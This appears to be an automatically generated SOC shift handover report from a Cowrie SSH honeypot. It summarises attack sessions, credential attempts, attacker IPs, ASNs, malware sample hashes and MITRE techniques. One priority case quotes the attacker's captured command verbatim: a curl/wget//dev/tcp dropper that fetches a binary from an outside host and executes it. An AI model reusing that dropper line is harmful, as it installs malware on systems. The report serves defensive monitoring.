# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-21 |
| **Generated At** | 2026-03-21T12:42:54Z |
| **Shift Time** | 12:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **49** |
| Confirmed Threats | **19** |
| False Positives Filtered | **30** (61.2%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **17** |
| High Severity Cases | **1** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **48** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **15** |
| Unique Credential Pairs | **15** |
| Unique Usernames | **12** |
| Unique Passwords | **14** |
| Successful Auth Pairs | **1** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 2 |
| `config` | 2 |
| `admin` | 2 |
| `default` | 1 |
| `blank` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `password` | 2 |
| `password321` | 1 |
| `blank2011` | 1 |
| `123456` | 1 |
| `maintenance` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `default` | `password321` | 1 |
| `blank` | `blank2011` | 1 |
| `root` | `123456` | 1 |
| `root` | `password` | 1 |
| `unknown` | `maintenance` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `password` | `120.24.240.112` | 2026-03-21T10:54:14 |

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **25** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38283` | CHINANET SiChuan Telecom Internet Data Center | 1 | HIGH |
| `AS51167` | Contabo GmbH | 1 | LOW |
| `AS4134` | CHINANET-BACKBONE | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | MEDIUM |
| `AS44217` | IQ Networks for Data and Internet Services Ltd | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS17577` | LG HelloVision Corp. | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (1)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-19bcf3807fa8

| Field | Detail |
|---|---|
| **Source IP** | `120.24.240[.]112` |
| **First Seen** | 2026-03-21 10:54 |
| **Last Seen** | 2026-03-21 10:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 1 && cat /bin/echo, nohup $SHELL -c "curl hxxp://47.122.113[.]12:60109/arm_linux -o /tmp/qv9t5u6eJR; if [ ! -f /tmp/qv9t5u6eJR ]; then wget hxxp://47.122.113[.]12:60109/arm_linux -O /tmp/qv9t5u6eJR; fi; if [ ! -f /tmp/qv9t5u6eJR ]; then exec 6<>/dev/tcp/47.122.113[.]12/60109 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/qv9t5u6eJR ; chmod +x /tmp/qv9t5u6eJR && /tmp/qv9t5u6eJR 6P+cm2NUni05JiudSHSVkumZmO+YjHVImSslOSicUmOdne+Tn++ZnXxGny45JS2ZSH+fnfGYmemSmn1Xmi83LzeaU3+Cmu+ch+eZlntWmiglNy2cSH+fkfGdm/GanXlcnSkmJSqLUnqCmuyeh+yYgnxWnC, head -c 2294564 > /tmp/f6D5e1oroI, nohup $SHELL -c "curl hxxp://47.122.113[.]12:60109/arm_linux -o /tmp/qv9t5u6eJR; if [ ! -f /tmp/qv9t5u6eJR ]; then wget hxxp://47.122.113[.]12:60109/arm_linux -O /tmp/qv9t5u6eJR; fi; if [ ! -f /tmp/qv9t5u6eJR ]; then exec 6<>/dev/tcp/47.122.113[.]12/60109 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/qv9t5u6eJR ; chmod +x /tmp/qv9t5u6eJR && /tmp/qv9t5u6eJR 6P+cm2NUni05JiudSHSVkumZmO+YjHVImSslOSicUmOdne+Tn++ZnXxGny45JS2ZSH+fnfGYmemSmn1Xmi83LzeaU3+Cmu+ch+eZlntWmiglNy2cSH+fkfGdm/GanXlcnSkmJSqLUnqCmuyeh+yYgnxWnC, 4` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1110.001 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 10:54:12` | `cowrie.session.connect` |
| `2026-03-21 10:54:12` | `cowrie.client.version` |
| `2026-03-21 10:54:12` | `cowrie.client.kex` |
| `2026-03-21 10:54:13` | `cowrie.login.failed` |
| `2026-03-21 10:54:14` | `cowrie.login.success` |
| `2026-03-21 10:54:14` | `cowrie.session.params` |
| `2026-03-21 10:54:14` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.failed` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.failed` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.failed` |
| `2026-03-21 10:54:21` | `cowrie.command.input` |
| `2026-03-21 10:54:21` | `cowrie.command.failed` |
| `2026-03-21 10:54:21` | `cowrie.log.closed` |
| `2026-03-21 10:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.24.240[.]112` to AbuseIPDB if not already reported
- [ ] Block `120.24.240[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `117.216.33[.]31` | 1 | 2026-03-21 11:05 | 2026-03-21 11:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.123.116[.]93` | 1 | 2026-03-21 11:48 | 2026-03-21 11:48 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.102[.]130` | 1 | 2026-03-21 12:37 | 2026-03-21 12:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.15.59[.]120` | 1 | 2026-03-21 12:41 | 2026-03-21 12:41 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `170.83.126[.]105` | 1 | 2026-03-21 12:37 | 2026-03-21 12:37 | 31s | 0 | `T1592` | 🟢 LOW |
| `178.150.135[.]19` | 1 | 2026-03-21 12:07 | 2026-03-21 12:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.53.52[.]68` | 1 | 2026-03-21 11:08 | 2026-03-21 11:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.106.59[.]245` | 1 | 2026-03-21 10:45 | 2026-03-21 10:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.9[.]22` | 1 | 2026-03-21 12:23 | 2026-03-21 12:24 | 12s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `196.191.142[.]67` | 1 | 2026-03-21 10:29 | 2026-03-21 10:29 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.84.34[.]85` | 1 | 2026-03-21 10:29 | 2026-03-21 10:30 | 35s | 0 | `T1592` | 🟢 LOW |
| `210.192.95[.]22` | 1 | 2026-03-21 12:30 | 2026-03-21 12:30 | 14s | 0 | `T1592` | 🟢 LOW |
| `49.124.148[.]200` | 1 | 2026-03-21 12:08 | 2026-03-21 12:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.17.6[.]119` | 1 | 2026-03-21 11:28 | 2026-03-21 11:28 | 11s | 0 | `T1592` | 🟢 LOW |
| `62.201.212[.]54` | 1 | 2026-03-21 11:20 | 2026-03-21 11:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.243.169[.]150` | 1 | 2026-03-21 10:33 | 2026-03-21 10:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `90.230.168[.]26` | 1 | 2026-03-21 11:59 | 2026-03-21 11:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.31.209[.]102` | 1 | 2026-03-21 11:40 | 2026-03-21 11:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `8.243.169[.]150` | CO | CTL Colombia | **100** ⚠️ | 2 |
| `182.53.52[.]68` | TH | TOT Public Company Limited | **100** ⚠️ | 50 |
| `118.123.116[.]93` | CN | CHINANET Sichuan province network | **100** ⚠️ | 24 |
| `157.15.59[.]120` | NP | Global Trading And IT Solution Pvt. Ltd. | **100** ⚠️ | 2 |
| `117.216.33[.]31` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 28 |
| `62.201.212[.]54` | IQ | IQ Networks for Data and Internet Services Ltd | **100** ⚠️ | 50 |
| `170.83.126[.]105` | AR | MARANDU COMUNICACIONES SOCIEDAD DEL ESTADO | **100** ⚠️ | 4 |
| `196.191.142[.]67` | ET | Ethio Telecom | **100** ⚠️ | 42 |
| `183.106.59[.]245` | KR | Korea Telecom | **100** ⚠️ | 19 |
| `210.192.95[.]22` | KR | HVYeongnam | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 15 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 1 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (30 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 28 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 49 cases |
| Tool 34  | Credential Extractor        | ✅ 15 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 25 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 30 filtered (61.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 1 priority case(s) shown individually · 18 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-21T12:42:54Z_
